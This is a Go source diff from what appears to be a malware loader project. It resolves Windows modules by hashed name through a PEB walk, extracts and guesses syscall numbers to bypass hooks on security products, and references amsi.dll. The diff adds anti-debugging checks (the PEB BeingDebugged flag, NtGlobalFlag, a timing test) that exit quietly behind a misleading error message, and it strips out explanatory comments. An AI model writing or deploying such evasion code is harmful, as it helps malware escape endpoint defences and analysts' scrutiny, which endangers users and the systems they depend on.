@@ -11,6 +11,8 @@ import (
 	"strings"
 	"github.com/Binject/debug/pe"
 	"loader/pkg/obf"
+	"runtime"
+	"os"
 )
 
 // Windows structures needed for PEB access
@@ -124,24 +126,60 @@ func utf16BytesToString(b []uint16) string {
 	return string(runes)
 }
 
-// GetCurrentProcessPEB retrieves a pointer to the PEB of the current process
-// This uses a direct assembly approach without any Windows API calls
+
 func GetCurrentProcessPEB() *PEB {
-	// Using direct assembly to get PEB
 	pebAddr := GetPEB()
 	if pebAddr == 0 {
 		log.Printf("Failed to get PEB address via assembly\n")
 		return nil
 	}
 	
-	// Add some retry attempts to ensure stability
+	peb := (*PEB)(unsafe.Pointer(pebAddr))
+	if peb != nil {
+		isDebugged := false
+		
+		if peb.BeingDebugged != 0 {
+			isDebugged = true
+		}
+		
+		ntGlobalFlag := *(*uint32)(unsafe.Pointer(pebAddr + 0x68))
+		const debuggerFlags uint32 = 0x70 
+		if (ntGlobalFlag & debuggerFlags) != 0 {
+			isDebugged = true
+		}
+		
+		startTime := time.Now()
+		var result uint64 = 0
+		for i := uint64(0); i < 1000; i++ {
+			result += i * i
+		}
+		_ = result 
+		elapsed := time.Since(startTime)
+		if elapsed > 10*time.Millisecond {
+			isDebugged = true
+		}
+		if isDebugged {
+			log.Printf("Error initializing critical components\n")
+			
+			bufSize := 1024
+			randBuf := make([]byte, bufSize)
+			for i := 0; i < bufSize; i++ {
+				randBuf[i] = byte(i ^ 0xAA)
+			}
+			
+			runtime.GC()
+			
+			os.Exit(runtime.NumGoroutine() % 255)
+			
+			return nil
+		}
+	}
+
 	maxRetries := 5
-	var peb *PEB
 	
 	for i := 0; i < maxRetries; i++ {
 		peb = (*PEB)(unsafe.Pointer(pebAddr))
 		
-		// Validate PEB pointer
 		if peb != nil && peb.Ldr != nil {
 			return peb
 		}
@@ -153,9 +191,7 @@ func GetCurrentProcessPEB() *PEB {
 	return peb
 }
 
-// GetModuleBase retrieves the base address of a module by its name hash
 func GetModuleBase(moduleHash uint32) uintptr {
-	// Add retry mechanism for GetModuleBase
 	maxRetries := 5
 	var moduleBase uintptr
 	
@@ -173,8 +209,6 @@ func GetModuleBase(moduleHash uint32) uintptr {
 			continue
 		}
 		
-		// Try all three module lists for better reliability
-		// Sometimes a DLL might be in one list but not the others
 		lists := []struct {
 			name string
 			entry *LIST_ENTRY
@@ -185,21 +219,17 @@ func GetModuleBase(moduleHash uint32) uintptr {
 		}
 		
 		for _, list := range lists {
-			// Get the head of the module list
 			entry := list.entry
 			currentEntry := entry.Flink
 		
-			// Ensure the linked list is valid
 			if currentEntry == nil {
 				log.Printf("Module list %s is invalid (nil), skipping\n", list.name)
 				continue
 			}
 		
-			// Iterate through the module list
 			var offset uintptr
 			var dataTableEntry *LDR_DATA_TABLE_ENTRY
 			
-			// Different lists have different offsets to LDR_DATA_TABLE_ENTRY
 			switch list.name {
 			case "InLoadOrderModuleList":
 				offset = 0 // No offset needed
@@ -211,48 +241,35 @@ func GetModuleBase(moduleHash uint32) uintptr {
 			
 			for currentEntry != entry {
 				if offset == 0 {
-					// For InLoadOrderModuleList
 					dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(currentEntry))
 				} else {
-					// For other lists, adjust the pointer
 					dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(currentEntry)) - offset))
 				}
 		
-				// Get the module name
 				baseName := UTF16ToString(dataTableEntry.BaseDllName.Buffer)
 				
-				// Skip if empty name (shouldn't happen but a safety check)
 				if baseName == "" {
 					currentEntry = currentEntry.Flink
 					continue
 				}
 				
-				// Normalize to lowercase for case-insensitive comparison
 				baseName = strings.ToLower(baseName)
 				
-				// Calculate the hash of the module name
 				currentHash := obf.DBJ2HashStr(baseName)
 				
-				// Debug output to check the found modules
-				// log.Printf("Found module: %s with hash 0x%X\n", baseName, currentHash)
-				
-				// If the hash matches, return the module base
 				if currentHash == moduleHash {
 					moduleBase = dataTableEntry.DllBase
 					break
 				}
 		
-				// Move to the next entry
 				currentEntry = currentEntry.Flink
 				
-				// Safety check to prevent infinite loops
 				if currentEntry == nil {
 					break
 				}
 			}
 			
 			if moduleBase != 0 {
-				// log.Printf("Found module base 0x%X in list %s\n", moduleBase, list.name)
 				break
 			}
 		}
@@ -261,48 +278,39 @@ func GetModuleBase(moduleHash uint32) uintptr {
 			break
 		}
 		
-		// Wait before retrying
 		time.Sleep(100 * time.Millisecond)
 	}
 
 	return moduleBase
 }
 
-// GetFunctionAddress retrieves the address of a function in a module by its name hash using Binject PE parser
 func GetFunctionAddress(moduleBase uintptr, functionHash uint32) uintptr {
 	if moduleBase == 0 {
 		return 0
 	}
 
-	// Read the PE header to get the actual size of the image
 	dosHeader := (*[64]byte)(unsafe.Pointer(moduleBase))
 	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
 		log.Printf("Invalid DOS signature\n")
 		return 0
 	}
 	
-	// Get the offset to the PE header
 	peOffset := *(*uint32)(unsafe.Pointer(moduleBase + 60))
 	if peOffset >= 1024 {
 		log.Printf("PE offset too large: %d\n", peOffset)
 		return 0
 	}
 	
-	// Read the PE header to get the SizeOfImage
 	peHeader := (*[1024]byte)(unsafe.Pointer(moduleBase + uintptr(peOffset)))
 	if peHeader[0] != 'P' || peHeader[1] != 'E' {
 		log.Printf("Invalid PE signature\n")
 		return 0
 	}
 	
-	// SizeOfImage is at offset 56 from the start of the OptionalHeader
-	// OptionalHeader starts at offset 24 from PE signature
 	sizeOfImage := *(*uint32)(unsafe.Pointer(moduleBase + uintptr(peOffset) + 24 + 56))
 	
-	// Create a memory reader for the PE file with the correct size
 	dataSlice := unsafe.Slice((*byte)(unsafe.Pointer(moduleBase)), sizeOfImage)
 	
-	// Parse the PE file from memory
 	file, err := pe.NewFileFromMemory(&memoryReaderAt{data: dataSlice})
 	if err != nil {
 		log.Printf("Failed to parse PE file: %v\n", err)
@@ -310,19 +318,16 @@ func GetFunctionAddress(moduleBase uintptr, functionHash uint32) uintptr {
 	}
 	defer file.Close()
 
-	// Get the exports
 	exports, err := file.Exports()
 	if err != nil {
 		log.Printf("Failed to get exports: %v\n", err)
 		return 0
 	}
 
-	// Search for the function by hash
 	for _, export := range exports {
 		if export.Name != "" {
 			currentHash := obf.DBJ2HashStr(export.Name)
 			if currentHash == functionHash {
-				// Return the function address (module base + RVA)
 				return moduleBase + uintptr(export.VirtualAddress)
 			}
 		}
@@ -331,7 +336,6 @@ func GetFunctionAddress(moduleBase uintptr, functionHash uint32) uintptr {
 	return 0
 }
 
-// memoryReaderAt implements io.ReaderAt for in-memory data
 type memoryReaderAt struct {
 	data []byte
 }
@@ -347,18 +351,13 @@ func (r *memoryReaderAt) ReadAt(p []byte, off int64) (n int, err error) {
 	return n, err
 }
 
-// GetSyscallNumber extracts the syscall number from a NTDLL syscall function
-// This function uses ONLY manual PE parsing and PEB walking - NO Windows API calls
 func GetSyscallNumber(functionHash uint32) uint16 {
-	// Try cache first for performance
 	if cached := getSyscallFromCache(functionHash); cached != 0 {
 		return cached
 	}
 
-	// Get the base address of ntdll.dll using PEB walking (no LoadLibrary)
 	ntdllHash := obf.GetHash("ntdll.dll")
 	
-	// Add retry mechanism with exponential backoff
 	var ntdllBase uintptr
 	maxRetries := 8
 	baseDelay := 50 * time.Millisecond
@@ -369,7 +368,6 @@ func GetSyscallNumber(functionHash uint32) uint16 {
 			break
 		}
 		
-		// Exponential backoff
 		delay := baseDelay * time.Duration(1<<uint(i))
 		if delay > 2*time.Second {
 			delay = 2 * time.Second
@@ -384,7 +382,6 @@ func GetSyscallNumber(functionHash uint32) uint16 {
 		return 0
 	}
 	
-	// Get the address of the syscall function using PE parsing (no GetProcAddress)
 	var funcAddr uintptr
 	
 	for i := 0; i < maxRetries; i++ {
@@ -393,7 +390,6 @@ func GetSyscallNumber(functionHash uint32) uint16 {
 			break
 		}
 		
-		// Exponential backoff
 		delay := baseDelay * time.Duration(1<<uint(i))
 		if delay > 2*time.Second {
 			delay = 2 * time.Second
@@ -408,10 +404,8 @@ func GetSyscallNumber(functionHash uint32) uint16 {
 		return 0
 	}
 
-	// Enhanced syscall stub validation and extraction
 	syscallNumber := extractSyscallNumberWithValidation(funcAddr, functionHash)
 	
-	// Cache the result if valid
 	if syscallNumber != 0 {
 		cacheSyscallNumber(functionHash, syscallNumber)
 	}
@@ -419,9 +413,7 @@ func GetSyscallNumber(functionHash uint32) uint16 {
 	return syscallNumber
 }
 
-// Helper function to map function hashes to their string names (for debugging/testing)
 func getFunctionNameFromHash(functionHash uint32) string {
-	// Map common function hashes to their names
 	commonFunctions := map[uint32]string{
 		obf.GetHash("NtAllocateVirtualMemory"): "NtAllocateVirtualMemory",
 		obf.GetHash("NtWriteVirtualMemory"):    "NtWriteVirtualMemory", 
@@ -436,12 +428,9 @@ func getFunctionNameFromHash(functionHash uint32) string {
 	return commonFunctions[functionHash]
 }
 
-// GetSyscallAndAddress returns both the syscall number and the address of the syscall instruction
 func GetSyscallAndAddress(functionHash uint32) (uint16, uintptr) {
-	// Get the base address of ntdll.dll using PEB walking (no LoadLibrary)
 	ntdllHash := obf.GetHash("ntdll.dll")
 	
-	// Add retry mechanism
 	var ntdllBase uintptr
 	maxRetries := 5
 	
@@ -459,7 +448,6 @@ func GetSyscallAndAddress(functionHash uint32) (uint16, uintptr) {
 		return 0, 0
 	}
 
-	// Get the address of the syscall function using PE parsing (no GetProcAddress)
 	var funcAddr uintptr
 	
 	for i := 0; i < maxRetries; i++ {
@@ -476,16 +464,13 @@ func GetSyscallAndAddress(functionHash uint32) (uint16, uintptr) {
 		return 0, 0
 	}
 
-	// The syscall number is at offset 4 in the syscall stub
 	syscallNumber := *(*uint16)(unsafe.Pointer(funcAddr + 4))
 	
-	// The syscall instruction is at offset 0x12 for x64
 	syscallInstructionAddr := funcAddr + 0x12
 	
 	return syscallNumber, syscallInstructionAddr
 }
 
-// Helper function to dump memory for debugging
 func dumpMemory(addr uintptr, size int) {
 	log.Printf("Memory dump at 0x%X:\n", addr)
 	for i := 0; i < size; i++ {
@@ -500,7 +485,6 @@ func dumpMemory(addr uintptr, size int) {
 	}
 }
 
-// SyscallCache provides thread-safe caching for resolved syscall numbers
 type SyscallCache struct {
 	cache map[uint32]uint16
 	mutex sync.RWMutex
@@ -510,7 +494,6 @@ var globalSyscallCache = &SyscallCache{
 	cache: make(map[uint32]uint16),
 }
 
-// getSyscallFromCache retrieves a cached syscall number
 func getSyscallFromCache(functionHash uint32) uint16 {
 	globalSyscallCache.mutex.RLock()
 	defer globalSyscallCache.mutex.RUnlock()
@@ -521,7 +504,6 @@ func getSyscallFromCache(functionHash uint32) uint16 {
 	return 0
 }
 
-// cacheSyscallNumber stores a syscall number in the cache
 func cacheSyscallNumber(functionHash uint32, syscallNumber uint16) {
 	globalSyscallCache.mutex.Lock()
 	defer globalSyscallCache.mutex.Unlock()
@@ -529,7 +511,6 @@ func cacheSyscallNumber(functionHash uint32, syscallNumber uint16) {
 	globalSyscallCache.cache[functionHash] = syscallNumber
 }
 
-// clearSyscallCache clears all cached syscall numbers (useful for testing)
 func clearSyscallCache() {
 	globalSyscallCache.mutex.Lock()
 	defer globalSyscallCache.mutex.Unlock()
@@ -537,7 +518,6 @@ func clearSyscallCache() {
 	globalSyscallCache.cache = make(map[uint32]uint16)
 }
 
-// GetSyscallCacheSize returns the number of cached syscalls
 func GetSyscallCacheSize() int {
 	globalSyscallCache.mutex.RLock()
 	defer globalSyscallCache.mutex.RUnlock()
@@ -545,34 +525,27 @@ func GetSyscallCacheSize() int {
 	return len(globalSyscallCache.cache)
 }
 
-// extractSyscallNumberWithValidation performs enhanced validation and extraction
 func extractSyscallNumberWithValidation(funcAddr uintptr, functionHash uint32) uint16 {
 	if funcAddr == 0 {
 		return 0
 	}
 
-	// Read enough bytes to analyze the function
 	const maxBytes = 32
 	funcBytes := make([]byte, maxBytes)
 	
-	// Safely read memory with bounds checking
 	for i := 0; i < maxBytes; i++ {
 		funcBytes[i] = *(*byte)(unsafe.Pointer(funcAddr + uintptr(i)))
 	}
 
-	// Try multiple syscall stub patterns for robustness
 	syscallNumber := tryExtractSyscallNumber(funcBytes, funcAddr, functionHash)
 	
-	// Validate the extracted syscall number
 	if syscallNumber > 0 && validateSyscallNumber(syscallNumber, functionHash) {
 		return syscallNumber
 	}
 
-	// Fallback: try alternative extraction methods
 	return tryAlternativeExtractionMethods(funcBytes, funcAddr, functionHash)
 }
 
-// tryExtractSyscallNumber attempts to extract syscall number using multiple patterns
 func tryExtractSyscallNumber(funcBytes []byte, funcAddr uintptr, functionHash uint32) uint16 {
 	if len(funcBytes) < 16 {
 		return 0
@@ -587,7 +560,7 @@ func tryExtractSyscallNumber(funcBytes []byte, funcAddr uintptr, functionHash ui
 		funcBytes[3] == 0xb8 {
 		
 		syscallNum := uint16(funcBytes[4]) | (uint16(funcBytes[5]) << 8)
-		if syscallNum > 0 && syscallNum < 2000 { // Reasonable range check
+		if syscallNum > 0 && syscallNum < 2000 { 
 			return syscallNum
 		}
 	}
@@ -616,32 +589,20 @@ func tryExtractSyscallNumber(funcBytes []byte, funcAddr uintptr, functionHash ui
 	return 0
 }
 
-// validateSyscallNumber performs additional validation on extracted syscall numbers
 func validateSyscallNumber(syscallNumber uint16, functionHash uint32) bool {
-	// Basic range validation
 	if syscallNumber == 0 || syscallNumber >= 2000 {
 		return false
 	}
 
-	// Check against known invalid ranges
-	// Syscall numbers should be reasonable for NT kernel functions
 	if syscallNumber < 2 {
-		// Only syscall numbers 0 and 1 are truly suspicious
 		log.Printf("Warning: Unusually low syscall number %d for hash 0x%X\n", 
 			syscallNumber, functionHash)
 	}
 
-	// Additional validation could include (if you want to submit a PR)
-	// - Cross-referencing with known good syscall numbers
-	// - Checking if the syscall number fits expected patterns
-	// - Validating against syscall tables from different Windows versions
-
 	return true
 }
 
-// tryAlternativeExtractionMethods provides fallback extraction when standard methods fail
 func tryAlternativeExtractionMethods(funcBytes []byte, funcAddr uintptr, functionHash uint32) uint16 {
-	// Method 1: Scan for MOV EAX instructions in the first 32 bytes
 	for i := 0; i < len(funcBytes)-4; i++ {
 		if funcBytes[i] == 0xb8 { // MOV EAX, imm32
 			syscallNum := uint16(funcBytes[i+1]) | (uint16(funcBytes[i+2]) << 8)
@@ -653,10 +614,8 @@ func tryAlternativeExtractionMethods(funcBytes []byte, funcAddr uintptr, functio
 		}
 	}
 
-	// Method 2: Look for syscall instruction and backtrack
 	for i := 0; i < len(funcBytes)-1; i++ {
-		if funcBytes[i] == 0x0f && funcBytes[i+1] == 0x05 { // SYSCALL instruction
-			// Found syscall instruction, now look backwards for MOV EAX
+		if funcBytes[i] == 0x0f && funcBytes[i+1] == 0x05 { 
 			for j := i; j >= 4; j-- {
 				if funcBytes[j-4] == 0xb8 { // MOV EAX, imm32
 					syscallNum := uint16(funcBytes[j-3]) | (uint16(funcBytes[j-2]) << 8)
@@ -671,7 +630,6 @@ func tryAlternativeExtractionMethods(funcBytes []byte, funcAddr uintptr, functio
 		}
 	}
 
-	// Method 3: Try reading at different offsets (handle potential hooks/patches)
 	alternativeOffsets := []int{8, 12, 16, 20}
 	for _, offset := range alternativeOffsets {
 		if offset+1 < len(funcBytes) {
@@ -690,7 +648,6 @@ func tryAlternativeExtractionMethods(funcBytes []byte, funcAddr uintptr, functio
 	return 0
 }
 
-// GetSyscallWithValidation provides additional metadata and validation
 func GetSyscallWithValidation(functionHash uint32) (uint16, bool, error) {
 	syscallNum := GetSyscallNumber(functionHash)
 	
@@ -698,14 +655,11 @@ func GetSyscallWithValidation(functionHash uint32) (uint16, bool, error) {
 		return 0, false, fmt.Errorf("failed to resolve syscall for hash 0x%X", functionHash)
 	}
 
-	// Additional validation
 	isValid := validateSyscallNumber(syscallNum, functionHash)
 	
 	return syscallNum, isValid, nil
 }
 
-// GuessSyscallNumber attempts to infer a syscall number for a hooked function
-// by finding clean left and right neighbors and interpolating the missing number.
 func GuessSyscallNumber(targetHash uint32) uint16 {
 	ntdllBase := GetModuleBase(obf.GetHash("ntdll.dll"))
 	if ntdllBase == 0 {
@@ -713,7 +667,6 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		return 0
 	}
 
-	// Parse exports from NTDLL
 	dosHeader := (*[2]byte)(unsafe.Pointer(ntdllBase))
 	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
 		log.Printf("Invalid DOS signature in NTDLL\n")
@@ -740,12 +693,10 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		return 0
 	}
 
-	// Sort exports by address
 	sort.Slice(exports, func(i, j int) bool {
 		return exports[i].VirtualAddress < exports[j].VirtualAddress
 	})
 
-	// Find the target function
 	targetIndex := -1
 	for i, exp := range exports {
 		if obf.GetHash(exp.Name) == targetHash {
@@ -759,10 +710,8 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		return 0
 	}
 
-	// Helper function to check if a function is hooked
 	isCleanSyscall := func(addr uintptr) (bool, uint16) {
 		bytes := *(*[8]byte)(unsafe.Pointer(addr))
-		// Check for standard syscall stub pattern
 		if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
 			syscallNum := uint16(bytes[4]) | uint16(bytes[5])<<8
 			return true, syscallNum
@@ -770,12 +719,10 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		return false, 0
 	}
 
-	// Helper function to check if two function names are NT/ZW pairs
 	isNtZwPair := func(name1, name2 string) bool {
 		if len(name1) < 2 || len(name2) < 2 {
 			return false
 		}
-		// Check if one starts with Nt and other with Zw, and rest is same
 		if (name1[:2] == "Nt" && name2[:2] == "Zw" && name1[2:] == name2[2:]) ||
 		   (name1[:2] == "Zw" && name2[:2] == "Nt" && name1[2:] == name2[2:]) {
 			return true
@@ -783,7 +730,6 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		return false
 	}
 
-	// First, check if there's a ZW/NT pair nearby (they have identical syscall numbers)
 	for offset := -5; offset <= 5; offset++ {
 		if offset == 0 {
 			continue
@@ -804,7 +750,6 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		}
 	}
 
-	// Find clean left neighbor
 	var leftSyscall uint16
 	var leftIndex int = -1
 	for i := targetIndex - 1; i >= 0 && i >= targetIndex-10; i-- {
@@ -816,7 +761,6 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		}
 	}
 
-	// Find clean right neighbor  
 	var rightSyscall uint16
 	var rightIndex int = -1
 	for i := targetIndex + 1; i < len(exports) && i <= targetIndex+10; i++ {
@@ -828,9 +772,7 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		}
 	}
 
-	// If we have both neighbors, interpolate
 	if leftIndex != -1 && rightIndex != -1 {
-		// Calculate the expected syscall number based on position
 		positionDiff := targetIndex - leftIndex
 		syscallDiff := rightSyscall - leftSyscall
 		indexDiff := rightIndex - leftIndex
@@ -843,7 +785,6 @@ func GuessSyscallNumber(targetHash uint32) uint16 {
 		}
 	}
 
-	// Fallback: use single neighbor with small offset
 	if leftIndex != -1 {
 		offset := targetIndex - leftIndex
 		guessed := leftSyscall + uint16(offset)
@@ -876,7 +817,7 @@ func Syscall(syscallNum uint16, args ...uintptr) (uintptr, error) {
 	return uintptr(ret), nil
 }
 
-// DebugListAllModules prints all modules loaded in the PEB for debugging purposes
+
 func DebugListAllModules() {
 	peb := GetCurrentProcessPEB()
 	if peb == nil {
@@ -889,7 +830,6 @@ func DebugListAllModules() {
 		return
 	}
 	
-	// Try all three module lists for better visibility
 	lists := []struct {
 		name string
 		entry *LIST_ENTRY
@@ -900,11 +840,9 @@ func DebugListAllModules() {
 	}
 	
 	for _, list := range lists {
-		// Get the head of the module list
 		entry := list.entry
 		currentEntry := entry.Flink
 		
-		// Ensure the linked list is valid
 		if currentEntry == nil {
 			log.Printf("[DEBUG] Module list %s is invalid (nil)\n", list.name)
 			continue
@@ -912,11 +850,9 @@ func DebugListAllModules() {
 		
 		log.Printf("[DEBUG] Module summary for %s:\n", list.name)
 		
-		// Iterate through the module list
 		var offset uintptr
 		var dataTableEntry *LDR_DATA_TABLE_ENTRY
 		
-		// Different lists have different offsets to LDR_DATA_TABLE_ENTRY
 		switch list.name {
 		case "InLoadOrderModuleList":
 			offset = 0 // No offset needed
@@ -928,42 +864,32 @@ func DebugListAllModules() {
 		
 		for currentEntry != entry {
 			if offset == 0 {
-				// For InLoadOrderModuleList
 				dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(currentEntry))
 			} else {
-				// For other lists, adjust the pointer
 				dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(currentEntry)) - offset))
 			}
 			
-			// Get the module name
 			baseName := UTF16ToString(dataTableEntry.BaseDllName.Buffer)
 			
-			// Skip if empty name
 			if baseName == "" {
 				currentEntry = currentEntry.Flink
 				continue
 			}
 			
-			// Normalize to lowercase for case-insensitive comparison
 			baseName = strings.ToLower(baseName)
 			
-			// Calculate the hash of the module name
 			currentHash := obf.DBJ2HashStr(baseName)
 			
-			// Print module information
 			log.Printf("[DEBUG]   - %s: 0x%X\n", baseName, currentHash)
 			
-			// Move to the next entry
 			currentEntry = currentEntry.Flink
 			
-			// Safety check to prevent infinite loops
 			if currentEntry == nil {
 				break
 			}
 		}
 	}
 	
-	// Also specifically check for amsi.dll
 	amsiHash := obf.GetHash("amsi.dll")
 	log.Printf("[DEBUG] Looking for module with hash 0x%X (amsi.dll)\n", amsiHash)
 	amsiBase := GetModuleBase(amsiHash)
